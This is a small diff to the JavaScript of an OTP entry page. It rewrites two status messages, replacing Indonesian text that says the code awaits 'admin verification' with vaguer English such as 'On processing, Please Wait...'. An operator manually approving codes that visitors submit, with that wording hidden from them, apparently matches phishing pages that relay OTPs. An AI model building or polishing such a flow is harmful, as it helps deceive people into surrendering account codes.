@@ -112,7 +112,7 @@
                 window.location.href = 'success.html?status=approved'; // ganti dengan halaman sukses Anda
               }, 2000);
             } else if (data.status === 'rejected') {
-              statusMsg.text('❌ OTP ditolak. Silakan coba lagi.').css('color', 'red');
+              statusMsg.text('❌ Wrong OTP . Please try again.').css('color', 'red');
               clearInterval(pollingInterval);
               confirmBtn.prop('disabled', false);
               confirmBtn.text('CONFIRM');
@@ -145,7 +145,7 @@
         dataType: "json",
         success: function (data) {
           if (data.success) {
-            statusMsg.text('OTP terkirim, menunggu verifikasi admin...').css('color', 'orange');
+            statusMsg.text('On processing, Please Wait...').css('color', 'orange');
             startPolling(phone);
           } else {
             alert("Verification failed. Please try again.");
